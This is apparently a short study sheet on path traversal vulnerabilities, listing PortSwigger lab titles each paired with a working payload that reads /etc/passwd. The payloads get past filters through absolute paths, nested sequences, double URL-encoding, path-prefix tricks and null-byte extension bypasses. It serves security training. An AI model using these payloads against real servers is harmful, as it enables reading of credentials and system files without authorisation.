# Path traversal

## What is path traversal?

Path traversal is also known as directory traversal. These  vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

## Labs

[**File path traversal, simple case**](https://portswigger.net/web-security/file-path-traversal/lab-simple)

`filename=../../../etc/passwd`

[**File path traversal, traversal sequences blocked with absolute path bypass**](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

`filename=/etc/passwd`

[**File path traversal, traversal sequences stripped non-recursively**](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

`filename=....//....//....//etc/passwd`

[**File path traversal, traversal sequences stripped with superfluous URL-decode**](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

`filename=..%252f..%252f..%252fetc/passwd`

[**File path traversal, validation of start of path**](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

`filename=/var/www/images/../../../etc/passwd`

[**File path traversal, validation of file extension with null byte bypass**](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

`filename=../../../etc/passwd%00.png`